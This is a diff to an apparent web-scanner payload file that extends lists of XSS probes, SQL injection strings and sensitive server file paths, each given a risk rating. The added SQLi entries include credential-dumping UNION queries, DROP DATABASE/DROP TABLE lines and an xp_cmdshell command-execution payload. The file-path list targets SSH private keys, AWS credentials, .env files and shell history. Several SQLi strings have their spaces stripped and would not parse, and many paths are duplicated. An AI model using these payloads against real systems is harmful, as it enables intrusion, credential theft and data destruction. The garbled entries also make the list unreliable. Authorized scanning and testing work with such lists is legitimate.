@@ -1,4 +1,4 @@
-# payloads.py
+
 
 # XSS Payloads with structured format
 XSS_PAYLOADS = [
@@ -64,7 +64,25 @@ XSS_PAYLOADS = [
     {"payload": "<b onmousedown=alert('XSS')>Click</b>", "risk": "low"},
     {"payload": "'><img src=x onerror=alert('XSS')>", "risk": "high"},
     {"payload": "<iframe src='javascript:alert(\"XSS\")'></iframe>", "risk": "high"},
-    {"payload": "<body onload=alert('XSS')>", "risk": "high"}
+    {"payload": "<body onload=alert('XSS')>", "risk": "high"},
+    {"payload": "<script>eval('alert(1)')</script>", "risk": "high"},
+    {"payload": "<img src='x' onerror=eval('alert(1)')>", "risk": "high"},
+    {"payload": "<svg/onload=eval('alert(1)')>", "risk": "high"},
+    {"payload": "<input type='image' src='x' onerror='alert(1)'>", "risk": "high"},
+    {"payload": "<input type='text' onfocus='eval(1)'>", "risk": "high"},
+    {"payload": "<body onload='eval(1)'>", "risk": "high"},
+    {"payload": "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>", "risk": "high"},
+    {"payload": "<script>setTimeout(function() { alert(1); }, 500);</script>", "risk": "medium"},
+    {"payload": "<script>document.write('<img src=x onerror=alert(1)>')</script>", "risk": "high"},
+    {"payload": "<iframe srcdoc='<script>alert(1)</script>'></iframe>", "risk": "high"},
+    {"payload": "<input type='text' onfocus='alert(1)'>", "risk": "medium"},
+    {"payload": "<body onbeforeunload='alert(1)'>", "risk": "high"},
+    {"payload": "<a href='javascript:void(0)' onclick='alert(1)'>Click me</a>", "risk": "medium"},
+    {"payload": "<svg><script>alert(1)</script></svg>", "risk": "high"},
+    {"payload": "<audio onerror='alert(1)'><source src='x'></audio>", "risk": "high"},
+    {"payload": "<div style='background-image: url(javascript:alert(1))'>XSS</div>", "risk": "high"},
+    {"payload": "<input type='file' onfocus='alert(1)'>", "risk": "medium"},
+    {"payload": "<button onclick='eval(1)'>Click</button>", "risk": "high"}
 ]
 
 
@@ -122,7 +140,27 @@ SQLI_PAYLOADS = [
     {"payload": "admin' OR '1'='1'--", "risk": "high"},
     {"payload": "' UNION SELECT 1,2,3--", "risk": "high"},
     {"payload": "' UNION SELECT null, username, password FROM users--", "risk": "high"},
-    {"payload": "' AND '1'='1", "risk": "medium"}
+    {"payload": "' AND '1'='1", "risk": "medium"},
+    {"payload": "' AND 1=1 -- ", "risk": "high"},
+    {"payload": "' UNION SELECT username, password, email FROM users -- ", "risk": "high"},
+    {"payload": "' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'users') -- ", "risk": "high"},
+    {"payload": "' AND SUBSTRING(@@version, 1, 1) = 5 --", "risk": "medium"},
+    {"payload": "'; DROP DATABASE test --", "risk": "high"},
+    {"payload": "' AND password LIKE '%admin%' --", "risk": "high"},
+    {"payload": "' UNION SELECT null, username, password, email FROM users --", "risk": "high"},
+    {"payload": "' OR 1=1; SELECT * FROM users --", "risk": "high"},
+    {"payload": "' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --", "risk": "high"},
+    {"payload": "'; SHOW TABLES --", "risk": "medium"},
+    {"payload": "1'AND1=1UNSELECTnull,username,passwordFROMusers--", "risk": "high"},
+    {"payload": "1'ORsleep(5)--", "risk": "high"},
+    {"payload": "';DROPTABLEusers;--", "risk": "high"},
+    {"payload": "1'OR1=1;--", "risk": "high"},
+    {"payload": "admin'OR'1'='1';--", "risk": "high"},
+    {"payload": "1'ANDEXISTS(SELECT*FROMinformation_schema.tablesWHEREtable_name='users')--", "risk": "high"},
+    {"payload": "'OR1=1--", "risk": "high"},
+    {"payload": "admin'UNSELECTnull,passwordFROMusers--", "risk": "high"},
+    {"payload": "';EXECxp_cmdshell('dir');--", "risk": "high"},
+    {"payload": "1'AND1=1ORDERBY1--", "risk": "medium"}
 ]
 
 
@@ -209,6 +247,34 @@ SENSITIVE_FILES = [
     {"payload": "/README.md", "risk": "low"},
     {"payload": "/LICENSE", "risk": "low"},
     {"payload": "/COPYING", "risk": "low"},
-    {"payload": "/robots.txt", "risk": "low"}
+    {"payload": "/robots.txt", "risk": "low"},
+      {"payload": "/etc/my.cnf", "risk": "high"},
+    {"payload": "/.git/objects/", "risk": "high"},
+    {"payload": "/var/www/html/.env", "risk": "high"},
+    {"payload": "/.terraform/environment.tf", "risk": "medium"},
+    {"payload": "/var/log/mysql/error.log", "risk": "high"},
+    {"payload": "/backup/mysql_dump.sql", "risk": "high"},
+    {"payload": "/.vscode/launch.json", "risk": "medium"},
+    {"payload": "/etc/ssh/sshd_config", "risk": "high"},
+    {"payload": "/home/user/.bash_profile", "risk": "medium"},
+    {"payload": "/.docker/config.json", "risk": "high"},
+    {"payload": "/etc/nginx/nginx.conf", "risk": "high"},
+    {"payload": "/root/.ssh/id_rsa", "risk": "high"},
+    {"payload": "/tmp/.git", "risk": "high"},
+    {"payload": "/var/www/html/backup.tar.gz", "risk": "high"},
+    {"payload": "/.bash_history", "risk": "high"},
+    {"payload": "/root/.bash_history", "risk": "medium"},
+    {"payload": "/home/user/.aws/credentials", "risk": "high"},
+    {"payload": "/etc/my.cnf", "risk": "high"},
+    {"payload": "/var/log/mysql/error.log", "risk": "high"},
+    {"payload": "/home/user/.bash_profile", "risk": "medium"},
+    {"payload": "/var/www/html/.env", "risk": "high"},
+    {"payload": "/usr/local/bin/.git", "risk": "high"},
+    {"payload": "/home/user/.docker/config.json", "risk": "high"},
+    {"payload": "/etc/ssh/sshd_config", "risk": "high"},
+    {"payload": "/etc/nginx/nginx.conf", "risk": "high"},
+    {"payload": "/root/.ssh/id_rsa", "risk": "high"},
+    {"payload": "/tmp/.git", "risk": "high"}
 
 ]
+
